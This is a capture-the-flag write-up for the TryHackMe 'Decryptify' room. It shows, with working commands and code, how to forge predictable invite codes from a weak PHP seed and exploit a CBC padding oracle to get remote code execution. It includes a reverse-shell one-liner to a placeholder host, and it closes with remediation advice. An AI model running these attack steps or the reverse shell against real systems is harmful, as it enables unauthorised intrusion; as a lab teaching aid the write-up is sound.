# Decryptify — TryHackMe Writeup

> **Platform:** TryHackMe · **Theme:** Web + Cryptography → RCE
> **Goal:** "Use your exploitation skills to uncover encrypted keys and get remote code execution (RCE)."
> **Author:** nos010101
>
> Secrets (passwords, keys, invite codes, flags) are **partially redacted** throughout.

---

## TL;DR — the kill chain

```
Obfuscated api.js  ──►  api.php password
      ──►  API docs leak the invite-code algorithm
      ──►  forge an invite code (predictable mt_rand seed)
      ──►  log in to the dashboard            [ crypto flag ]
      ──►  CBC PADDING ORACLE on the `date` parameter
      ──►  forge a ciphertext that decrypts to a shell command
      ──►  RCE                                [ RCE flag ]
```

The room is deliberately **two-phase**: first a *predictable-token* problem (no real cryptography, pure reconstruction), then a *real-cipher oracle* problem. Recognising which phase you are in is half the battle.

---

## 1. Recon

### 1.1 Port scan

```bash
nmap -sCV -Pn -O -p- decrypto.thm
```

Two services:

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH 8.2p1 (Ubuntu) | out of scope for the intended path |
| 1337 | Apache 2.4.41 (Ubuntu) | the whole app lives here |

The login page (`Login - Decryptify`) exposes two auth flows — a normal login and a **"Login with Invite Code"** tab — plus a footer link to `api.php` ("API Documentation").

A quick probe of the login form reveals a **user-enumeration oracle** (WSTG-IDNT-04): a non-existent account returns `User <email> does not exist`, which distinguishes valid vs invalid users.

### 1.2 Content discovery

```bash
feroxbuster -u 'http://decrypto.thm:1337/' \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

Interesting hits (ignore the noise — a stock **phpMyAdmin** install eats a lot of recursion; tame it with `--dont-scan phpmyadmin` or `--depth 2`):

```
200  /js/api.js
200  /api.php
301  /logs/           <-- OPEN directory listing
200  /logs/app.log
301  /phpmyadmin/
```

The open `/logs/` listing and `/js/api.js` are the two leads that unravel everything.

---

## 2. Phase 1 — from client-side secret to dashboard

### 2.1 Deobfuscating `api.js`

`api.js` is protected with **javascript-obfuscator** (the classic *string-array rotation* scheme): an array of strings is rotated inside an IIFE until an internal checksum (`=== 0xe43f0`) matches, then a getter pulls elements by index.

Do **not** reverse it by hand — just let the engine unwind it. Append a `console.log` and run it:

```bash
node -e "$(curl -s http://decrypto.thm:1337/js/api.js); console.log(c)"
# c = H7gY2tJ9****4rS1
```

The array is mostly *checksum junk* (the number-prefixed strings feed the self-check). The single meaningful payload — `H7gY2tJ9****4rS1` — turns out to be the **password for `api.php`**.

> **Class:** security-through-obscurity / client-side secret — WSTG-CRYP-04, CWE-615, CWE-656. Obfuscation is not protection; the client can always run what it was given.

### 2.2 `api.php` — the invite-code algorithm

Entering the recovered password unlocks the API documentation, which hands us the token-generation code:

```php
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex    = hexdec(substr($email, 0, 8));
    $seed_value   = hexdec($email_length + $constant_value + $email_hex);
    return $seed_value;
}

$seed_value  = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random      = mt_rand();
$invite_code = base64_encode($random);
```

**The vulnerability (VULN #1):** the PRNG seed is derived *entirely* from the email plus a fixed constant. PHP's `mt_rand()` is a deterministic Mersenne Twister — same seed, same output — so the "random" invite code is **fully reproducible for any email**.

> **Class:** weak PRNG + predictable seed — CWE-330 / CWE-337 / CWE-338, WSTG-SESS-01, WSTG-ATHN.

Two PHP quirks matter when reproducing the seed:

- `hexdec(substr($email,0,8))` — `hexdec()` **silently drops non-hex characters**, so only `[0-9a-f]` from the first 8 characters survive.
- The inner `$len + $const + $hex` is ordinary decimal addition; `hexdec()` then re-parses that **decimal** result as if it were **hex**.
- `base64_encode($int)` coerces the integer to its **decimal string** first, e.g. `base64_encode(1348337122) == "MTM0****Mg=="`.

### 2.3 The leaked pair in `app.log`

`/logs/app.log` leaks the invite workflow, including one known **(email → code)** pair:

```
... (Invite created, code: MTM0****Mg== for alpha@fake.thm)
... (User alpha@fake.thm deactivated)
... (New user created: hello@fake.thm)
```

`base64 -d` of that code gives `1348337122`.

> **Trap:** `1348337122` *looks* like a 2012 Unix timestamp — it is **not**. The `api.php` docs prove it is an `mt_rand()` output. Don't over-fit an integer to "looks like a timestamp."

The `@fake.thm` accounts are decoys (one is deactivated), but the pair itself is exactly what we need: a **known-answer oracle to recover the single unknown — the constant.**

### 2.4 Recovering the constant & forging invites

Brute-force the constant against the known pair. **Run it in PHP** so `mt_srand`/`mt_rand` behaviour matches the target exactly (do *not* reimplement Mersenne Twister in Python):

```php
<?php
$known_email = "alpha@fake.thm";
$known_rand  = 1348337122;          // base64_decode of the logged code

function seed_for($email, $c) {
    $hex = hexdec(substr($email, 0, 8));
    return hexdec(strlen($email) + $c + $hex);
}

$constant = null;
for ($c = 0; $c <= 1000000; $c++) {
    mt_srand(seed_for($known_email, $c));
    if (mt_rand() === $known_rand) { $constant = $c; break; }
}
echo "constant = $constant\n";       // constant = 9**99

$target = $argv[1] ?? "hello@fake.thm";
mt_srand(seed_for($target, $constant));
echo "invite_code($target) = " . base64_encode((string)mt_rand()) . "\n";
```

The recovered constant is a round `9**99` (uniquely determined — for the known email the decimal sum must equal exactly one value).

> **Gotcha worth documenting:** the seed construction is **not injective** — different `(email, constant)` pairs collapse to the same decimal sum and therefore the same seed/code. If you accidentally re-point the *known email* onto a new target while keeping the old expected output, the brute returns a **bogus, circular** constant that "coincidentally" reproduces the old code. Fix: keep the known pair **pinned** to `alpha@fake.thm`; only vary `$target`.

`alpha` is deactivated, so target the freshly-created **active** user `hello@fake.thm`. Forge its code and log in via the invite flow:

```bash
CODE=$(php forge.php hello@fake.thm | awk -F'= ' '/invite_code/{print $NF}')

curl -s -c cookies.txt \
  --data-urlencode "invite_username=hello@fake.thm" \
  --data-urlencode "invite_code=$CODE" \
  http://decrypto.thm:1337/index.php
```

Hitting the dashboard now shows the first flag and a user table:

```
Welcome, hello@fake.thm! - Flag: THM{Cryptography****007}

Username           Role
hello@fake.thm     user
admin@fake.thm     admin
```

**Crypto flag:** `THM{Cryptography****007}`

---

## 3. Phase 2 — from encrypted parameter to RCE

### 3.1 The two encrypted blobs

The authenticated dashboard exposes two ciphertexts:

1. A **hidden GET form** in the footer:
   `?date=yO6PQ/Ob****4Tf4=` — base64, decodes to **32 raw bytes** (binary, not text).
2. A **`role` cookie** (`httpOnly`, lowercase-hex, 48 bytes = 3 blocks) — an encrypted authorization token.

The footer renders the current year inside `<strong>2026\n</strong>`. That **trailing newline** is the tell: the decrypted `date` value is being handed to a **shell command** (`shell_exec($decrypted)`), whose stdout is echoed back — a textbook RCE sink.

### 3.2 A deliberate dead end (and the insight that ends it)

Because we already own a 16-byte secret (`H7gY2tJ9****4rS1`), the tempting move is to treat it as an AES-128 key and decrypt `date`. It **fails** under every sensible combination — AES-128/192/256 × ECB/CBC/CFB/OFB/CTR × key derivations `{raw, NUL-padded, md5, sha256}` (verified with the IV-independent CBC block-2 test). All garbage.

The reason becomes obvious the moment a padding-oracle tool fingerprints the token:

```
[+] detected block length: 8
```

**Block length 8 ⇒ a 64-bit block cipher (DES / 3DES / Blowfish), not AES.** The whole AES-key hunt was doomed twice over: wrong cipher *and* — as we're about to see — no key required at all.

> **Takeaway:** determine the **block size first**. It tells you the cipher family (8 = DES-class, 16 = AES) and stops you burning time on the wrong algorithm.

### 3.3 Padding oracle, briefly

If a CBC endpoint reveals whether decrypted **PKCS#7 padding** is valid (via a distinct response, status, length, or error), it becomes a **padding oracle**:

- For any block `C_i`, the plaintext is `P_i = D(C_i) XOR C_{i-1}`.
- By tampering the attacker-controlled previous block `C_{i-1}` and watching the oracle, you recover the *intermediate state* `D(C_i)` one byte at a time — **without the key**.
- That gives you **decryption**, and — by choosing `C_{i-1} = D(C_i) XOR P*` — **forgery of arbitrary plaintext** too.

> **Class:** CBC padding oracle — WSTG-CRYP-02. Root cause: unauthenticated CBC with no MAC (CWE-347) plus a padding-validity signal (CWE-209). The attack is **key- and cipher-agnostic**.

### 3.4 Exploiting with `padre`

Tool: [`padre`](https://github.com/glebarez/padre) (prebuilt `padre-linux-amd64`).

```bash
curl -sL -o padre https://github.com/glebarez/padre/releases/latest/download/padre-linux-amd64
chmod +x padre
file ./padre           # sanity: ELF 64-bit executable, not an HTML 404 page
```

Extract the session + role cookies (the oracle is behind auth, so `padre`'s thousands of requests need a live session):

```bash
SESS=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt | tail -1)
ROLE=$(awk '$6=="role"{print $7}'      cookies.txt | tail -1)
```

Auto-fingerprinting fails on the `role` cookie (its valid/invalid signal is app-specific) but **succeeds on `date`**. Decrypt it:

```bash
./padre \
  -u 'http://decrypto.thm:1337/dashboard.php?date=$' \
  -cookie "PHPSESSID=$SESS; role=$ROLE" \
  'yO6PQ/Ob****4Tf4='
```

```
[+] successfully detected padding oracle
[+] detected block length: 8
[!] mode: decrypt
[1/1] date +%Y\x08\x08\x08\x08\x08\x08\x08\x08
```

The plaintext is literally the whole command **`date +%Y`** (exactly 8 bytes, so PKCS#7 adds a full `0x08`×8 padding block). The server runs the *entire decrypted string* as a shell command — so if we can forge the plaintext, we control the command.

### 3.5 Forge a command → RCE

`padre`'s encrypt mode rebuilds a valid ciphertext from arbitrary plaintext using the same oracle. **Forge and fire are two separate steps** — a very easy mistake is to append `-enc` to `curl` (curl reads it as `-e/--referer` and silently reuses the old token).

A small wrapper keeps them apart and pulls the command output straight out of the footer:

```bash
run() {
  local tok
  tok=$(./padre \
        -u 'http://decrypto.thm:1337/dashboard.php?date=$' \
        -cookie "PHPSESSID=$SESS; role=$ROLE" \
        -enc "$1" 2>/dev/null | tail -1)
  curl -s -G -b "PHPSESSID=$SESS; role=$ROLE" \
       --data-urlencode "date=$tok" \
       http://decrypto.thm:1337/dashboard.php \
    | perl -0777 -ne 'print "$1\n" while /<strong>(.*?)<\/strong>/gs'
}
```

Prove execution, then locate and read the flag:

```bash
run 'id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

run 'find / -maxdepth 4 -iname "*flag*" 2>/dev/null'
# /home/ubuntu/flag.txt

run 'cat /home/ubuntu/flag.txt'
# THM{GOT_COMMAND_****001}
```

**RCE flag:** `THM{GOT_COMMAND_****001}`

> For interactive work, forge a reverse shell the same way:
> `run 'bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"'` with `nc -lvnp 4444` listening.

---

## 4. Vulnerability summary

| # | Finding | Where | Classification |
|---|---------|-------|----------------|
| 1 | Client-side secret hidden only by JS obfuscation | `api.js` → `api.php` password | CWE-615 / CWE-656, WSTG-CRYP-04 |
| 2 | Information disclosure via open directory listing | `/logs/app.log` | CWE-548 |
| 3 | User enumeration | login form | WSTG-IDNT-04 |
| 4 | Predictable auth token (weak PRNG, email-derived seed) | invite code | CWE-330/337/338, WSTG-SESS-01 |
| 5 | CBC padding oracle → decrypt & forge without key | `date` parameter | CWE-347 + CWE-209, WSTG-CRYP-02 |
| 6 | OS command injection via decrypted input | `shell_exec($date)` | CWE-78 |

---

## 5. Remediation

- **Don't put secrets in client-side code.** Obfuscation ≠ protection; move the API gate server-side.
- **Generate tokens from a CSPRNG** (`random_bytes`), never from a value the attacker controls (the email). Store invite codes; don't derive them deterministically.
- **Use authenticated encryption.** AES-GCM or encrypt-then-MAC removes the padding oracle entirely; return **uniform** errors regardless of padding validity.
- **Never pass decrypted/user-influenced data to a shell.** Use `date()` in PHP, or an argument array with `escapeshellarg`, and drop `shell_exec` for this feature.
- Disable directory listing (`Options -Indexes`) and move logs out of the web root; return generic auth errors to kill enumeration.

---

## 6. Lessons learned

1. **Check the block size first.** `8` immediately rules out AES (16) and points at DES/3DES/Blowfish — it would have saved the entire AES-key detour.
2. **A padding oracle needs neither the key nor the cipher's identity.** Both branches I chased (find the AES key; break the `role` cookie) were unnecessary once the oracle on `date` was confirmed.
3. **base64 is transport, not cryptography.** The invite code was `base64(plaintext)` (read it by decoding); `date` was `base64(ciphertext)` (only the oracle reveals it). Same wrapper, very different core.
4. **Don't over-fit an integer to "timestamp."** `1348337122` was an `mt_rand()` output, not an epoch.
5. **Forge and fire are two commands.** Keep tool output and the HTTP request strictly separate.
6. **Log your ruled-out branches** — the AES-key dead end and the `role`-cookie oracle are as instructive as the working path.

---

## 7. Tools

`nmap` · `feroxbuster` · `node` (deobfuscation) · `php-cli` (invite forgery) · `curl` · [`padre`](https://github.com/glebarez/padre) (padding oracle) · `perl` (output extraction)
